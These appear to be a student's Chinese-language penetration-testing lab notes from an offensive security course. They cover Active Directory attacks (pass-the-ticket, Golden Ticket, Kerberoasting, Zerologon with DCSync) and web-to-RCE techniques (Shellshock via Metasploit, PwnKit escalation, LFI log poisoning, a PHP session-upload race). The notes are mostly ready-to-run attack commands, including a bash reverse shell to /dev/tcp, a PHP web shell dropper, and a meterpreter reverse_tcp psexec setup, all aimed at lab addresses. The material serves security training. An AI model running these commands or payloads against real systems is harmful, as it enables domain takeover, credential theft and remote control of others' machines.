![image](images/SyWteKMvT.png)
![image](images/rkxqxtMvp.png)


原cmd視窗
klist
![image](images/BkqolFGPT.png)
//krbtgt是黃金票卷

速丟檔案密技
\\<PC NAME>\c$
\\ADWin\c$
![image](images/SJTKK9zwp.png)

把剛剛eport出來的票卷都丟過去

去AD Win
把local admin換密碼
確保本機用戶

dir \\server2019.lpt.com\c$
會發現不能使用
![image](images/HydPKKMwT.png)

使用cat_mimikatz.exe
kerberos::ptt <*.kirbi 票卷檔名>
![image](images/H1FpYtzPT.png)

kerberos::list
![image](images/B18zKcMwa.png)


cmd視窗
dir \\server2019.lpt.com\c$
![image](images/HkQZKqfD6.png)

這時候就看到根目錄了

---

### Golden Ticket Attack

去parrot

sudo nano /etc/hosts
加入
192.168.177.19 server2019.lpt.com
![image](images/BJJacqMPT.png)

secretsdump.py administrator:'Pa$$w0rd'@192.168.177.19 -just-dc-user krbtgt
![image](images/HkqcicMDT.png)
框起來的是hash

python3 /opt/impacket/example/lookupsid.py administrator:'Pa$$w0rd'@192.168.177.19 0
![image](images/SyflZozPp.png)
取得Domain SID

python3 /opt/impacket/example/ticketer.py -nthash <hash> -domain-sid <domain-sid> -domain lpt.com evil
![image](images/Hyt5bsfwT.png)


export KRB5CCNAME=evil.ccache

psexec.py lpt.com/evil@server2019.lpt.com -k -no-pass -dc-ip 192.168.177.19
![image](images/ryo9nsfP6.png)
成功

---

### Kerberoasting
1. 驗證(SPN Scan)
2. 取得TGST
3. 破解

先幫2019DC註冊服務
setspn -s http/lpt.com user-one
![image](images/BkxRJhfv6.png)


到parrot

前提條件是你要拿到1組AD合法的帳號密碼身份
GetUserSPNs.py 'lpt.com/cpent:Pa$$w0rd' -dc-ip 192.168.177.19 -request -outputfile kerberoast.txt
取得TGST
![image](images/Hk1gyhMPa.png)

直接用john破解hash取得密碼
![image](images/HJsmknzwT.png)


---

### Rubeus

Rubeus kerberoast /domain:lpt.com

--- 

### Zerologon

要下載新版的mimikatz，才有zerologon

lsadump::Zerologon /target:192.168.177.19 /account:server2019$ /null /ntlm /exploit

lsadump::postzerologon /target:192.168.177.19 /account:server2019$

lsadump::dcsync /authdomain:lpt /authuser:server2019$ /authpassword:"" /authntlm /domain:lpt.com /dc:server2019 /user:administrator

lsadump::dcsync /authdomain:lpt /authuser:server2019$ /authpassword:"" /authntlm /domain:lpt.com /dc:server2019 /user:krbtgt

#### Pthprivilege::debug
sekurlsa::pth /user:Administrator /domain:lpt.com /ntlm:<(HASH)>

#### PtT
kerberos::golden /domain:lpt.com /sid:<(SID)> /krbtgt:<(HASH)> /user:evil /ptt
    
misc::cmd
klist add_bind lpt.com server2019.lpt.com

OR
    
kerberos::golden /domain:lpt.com /sid:<(SID)> /krbtgt:<(HASH)> /user:evil /ticket:evil.tck
    
---
    
## Web to RCE
在LAB module 6

### shellcode
參考一下
https://www.sentinelone.com/blog/malicious-input-how-hackers-use-shellcode/
看一下到ubuntu (Wordpress)
usr/lib/cgi-bin/shellshock
![image](images/BJPL-hzP6.png)
製作一個keygen目錄
sudo mv shellshock keygen
![image](images/rkFOtnfDa.png)

    
到parrot    
掃描目錄
dirb http://192.168.0.24
![image](images/r1JZfnGPp.png)

發現http://192.168.0.24/cgi-bin/403
    
dirb http://192.168.0.24/cgi-bin
![image](images/rkI9q2Mvp.png)

發現
http://192.168.0.24/cgi-bin/keygen
    
至於為什麼是shellshock漏洞，靠經驗，通常cgi-bin目錄下的漏洞都是shellshock
    
直接使用metaspoit
use exploit/multi/http/apache_mod_cgi_bash_env_exec
show options
set RHOSTS 192.168.0.24
set RPORT 80
set TARGETURI /cgi-bin/keygen
exploit
![image](images/H1iWGTMDa.png)
![image](images/SyQ7MpzDa.png)
![image](images/rJAYVpfvT.png)
![image](images/BkJsVTMvp.png)

進入meterpreter
shell
tty
script -c /bin/bash -q /dev/null
tty
id
uname -a
![image](images/B11HSpGva.png)
linux版本是i686，所以OS是32bit
提權，使用pwnkit exploit
下載32位元版本
    
抓payload近來
    
chmod +x PwnKit32
./PwnKit32
id
![image](images/rJp5w0zDp.png)
※路徑記得去切換到tmp
    
---

### LFI to RCE
    
cd /var/www/html/
echo '<?php phpinfo();?>' > info.php 
echo '<?php include($_GET["file"]));?>' > info.php     

or
    
echo '<?php phpinfo(); ?>' >> /var/www/html/info.php
echo '<?php include($_GET["file"]); ?>' >> /var/www/html/inc.php

chmod -R 775 /var/log/apache2/
    

curl -G http://192.168.0.10/inc.php --data-urlencode "f=/var/log/apache2/access.log" --data-urlencode "1=bash -c 'bash -i > /dev/tcp/192.168.0.18/8888 0<&1 2>&1'"
    
這樣就植入reverse shell了

---
老師補充
https://blog.orange.tw/2018/10/
    
老師的破解法
1. PHP > 5.4
2. Enable File Upload (Default Enabled)
3. Enable File Upload Progress (Default Enabled)
4. Vulnerable to LFI
5. Can include SESSION FILE
  sess_{PHPSESSID}
  PHP_SESSION_UPLOAD_PROGRESS
6. Common Path
/var/lib/php/sessions/
/var/lib/php/session/
/tmp/
/var/lib/php5/

實作
192.168.0.10/inc.php?f=info.php
檢查版本
check_Enable File Upload
on
check_Enable File Upload Progress
on

開始
python -c 'print "A"*2048*1024' >> junk.txt
wc junk.txt

創一個evildropper.txt
evildropper:<?php file_put_contents('/tmp/shell.php','<?php system($_GET[3]);?>')?>

這個視窗負責include
curl -s "http://192.168.0.10/inc.php?f=var/lib/php5/sess_uploadlupload" | grep evildropper
我們會希望不斷include
加入迴圈
while true; do (curl -s "http://192.168.0.10/inc.php?f=var/lib/php5/sess_uploadupload" | grep evildropper ); done

這個視窗負責upload
curl http://192.168.0.10/inc.php -H 'Cookie:PHPSESSID=uploadupload' -F 'PHP_SESSION_UPLOAD_PROGRESS=evildropper' -F 'files=@junk.txt'
接下來不斷upload，總會有撞到的時候，如果一直沒撞到要檢查指令有沒有錯誤


成功
修改payload
curl http://192.168.0.10/inc.php -H 'Cookie:PHPSESSID=uploadupload' -F 'PHP_SESSION_UPLOAD_PROGRESS=evildropper' -F 'files=@junk.txt'
改成
curl http://<ip_addr>/inc.php -H 'Cookie: PHPSESSID=uploadupload' -F 
'PHP_SESSION_UPLOAD_PROGRESS=<evildropper.txt' -F 'files=@junk.txt'

看看192.168.0.10/inc.php?f=/tmp/shell.php&3=id

---

### Setup WordPress
nano /etc/php5/apache2/php.ini
[Ctrl-W] OR [F6] upload_max_filesize
service apache2 restart

改2m

wordpress editor 1.1.1.1
https://www.exploit-db.com/exploits/44340
網站下面還有大神POC可以用

進wordpress後台
http://192.168.0.10/wordpress/wp-admin
> admin / qwerty@123

plugins 
把下載的site...(攻擊包)丟進去

wpscan --url http://192.168.0.10/wordpress/ -e u,p

補充

可以用爆破的方式
wpscan --url http://192.168.0.10/wordpress/ -P <字典檔>


---
# 心法
445 smb
3389 rdp
22 ssh
80 dirb


# exploit/windows/smb/psexec
msf > use exploit/windows/smb/psexec
msf exploit(windows/smb/psexec) > set rhost 192.168.2.118
msf exploit(windows/smb/psexec) > set smbuser administrator
msf exploit(windows/smb/psexec) > set smbpass P@ssw0rd
msf exploit(windows/smb/psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(windows/smb/psexec) > set LHOST 192.168.2.145
msf exploit(windows/smb/psexec) > set LPORT 4444
msf exploit(windows/smb/psexec) > exploit

增加路由方法
msf exploit(windows/smb/psexec) > bg
msf exploit(windows/smb/psexec) > route add (ip_subnet) (遮罩) 1

Get-Smbserverconfiguration | Select EnableSMB2Protocol

列舉
auxiliary/scanner/portscan/tcp

好用爆破
auxiliary/scanner/smb/smb

# 抓封包
`tcpdump tcp port 502 -vv -w modbus.cap`
```
mbtcp.trans_id==(number)
```
# md5 dig
linux
`md5sum (filename)`
windows
certutil -hashfile (filename) md5